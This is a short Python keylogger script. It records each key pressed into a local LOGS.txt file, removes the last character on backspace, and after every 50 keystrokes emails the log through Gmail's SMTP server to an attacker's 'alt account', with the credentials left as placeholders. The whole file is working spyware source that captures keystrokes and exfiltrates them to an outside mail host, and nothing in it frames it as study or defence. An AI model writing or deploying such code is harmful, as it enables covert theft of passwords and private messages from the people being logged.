import os, getkey
from getkey import *
import smtplib
from email.mime.text import MIMEText

with open('LOGS.txt', 'r') as file:
    data = file.read() # Opens the file and reads the data

smtp_ssl_host = 'smtp.gmail.com'  # smtp.mail.yahoo.com
smtp_ssl_port = 465 #sets the port for the server
email = 'ENTER_ALT_EMAIL' # Your alt acount's email
password = 'ENTER_PASSWORD' # Password of your alt account
sender = email # sets the sender to your email
target = [email] # Must be a list, can enter other emails

msg = MIMEText(data) # sets the contents of the email
msg['Subject'] = 'logs' # sets the subject
msg['From'] = sender # sets who is the email from
msg['To'] = ', '.join(target) # sets who to send the email to


timer = 0 # sets the timer to 0

def SendMail(): # Definates sending the enail
  server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port) #Starts the server
  msg = MIMEText(data) # sets the message
  server.login(email, password) #logins
  server.sendmail(sender, target, msg.as_string()) #send the email
  
while True:

    timer += 1 # add 1 to the timer
    print(timer) #prints the timer
    key = getkey() #gets the key that was pressed
    L = open('LOGS.txt', "a") #Opens the logs
    with open('LOGS.txt') as infile:
      words = 0
      characters = 0
      for lineno, line in enumerate(infile, 1): # for every line
        wordslist = line.split()
        words += len(wordslist)
        characters += sum(len(word) for word in wordslist) #checks the worsd
    if key == '' and characters != 0:
      with open('LOGS.txt', 'rb+') as filehandle:
        filehandle.seek(-1, os.SEEK_END)
        filehandle.truncate() #errases if backspace is pressed
    elif key != '':
      L.write(key) #write the key if it isnt backspace
      L.close()
    if timer == 50: #checks if 50 keys were pressed
      timer  = 0 #resets the timer
      SendMail() #sends the email
      
    
